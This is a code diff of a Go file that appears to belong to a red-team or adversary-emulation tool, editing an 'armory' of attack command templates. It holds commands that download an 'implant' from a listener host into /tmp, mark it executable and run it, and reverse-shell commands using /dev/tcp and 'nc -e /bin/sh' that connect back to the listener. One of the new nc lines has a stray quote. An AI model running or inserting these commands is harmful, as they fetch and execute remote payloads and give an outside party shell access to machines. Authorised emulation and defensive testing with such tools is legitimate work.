@@ -106,7 +106,7 @@ func LoadArmory(dir string) (Armory, error) {
 			// Cmd: "sh -c \"wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause && chmod +x /tmp/pause && /tmp/pause &\"",
 			CmdVariants: []domain.CmdVariant{
 				{Key: "curl", Command: `sh -c "curl -L $LISTENER:$FILESHARE_PORT/implant -o /tmp/pause && chmod +x /tmp/pause && /tmp/pause &"`},
-				{Key: "wget", Command: "wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause && chmod +x /tmp/pause && /tmp/pause &"},
+				{Key: "wget", Command: `sh -c "wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause && chmod +x /tmp/pause && /tmp/pause &"`},
 			},
 			Requires: domain.Requirements{AccessLevel: domain.UserExec},
 		},
@@ -159,8 +159,8 @@ func LoadArmory(dir string) (Armory, error) {
 			Description: "Establish a simple shell",
 			Tactics:     []domain.Tactic{domain.Execution},
 			CmdVariants: []domain.CmdVariant{
-				{Key: "bash", Command: "sh -i >& /dev/tcp/$LISTENER/$LISTENER_PORT 0>&1 &"},
-				{Key: "nc", Command: "nc $LISTENER $LISTENER_PORT -e /bin/sh &"},
+				{Key: "shell", Command: `bash -c "bash >& /dev/tcp/$LISTENER/$LISTENER_PORT 0>&1 &"`},
+				{Key: "nc", Command: `bash -c "nc "$LISTENER $LISTENER_PORT -e /bin/sh &"`},
 			},
 			Requires: domain.Requirements{Infra: []string{"Listener"}, AccessLevel: domain.UserExec},
 		},
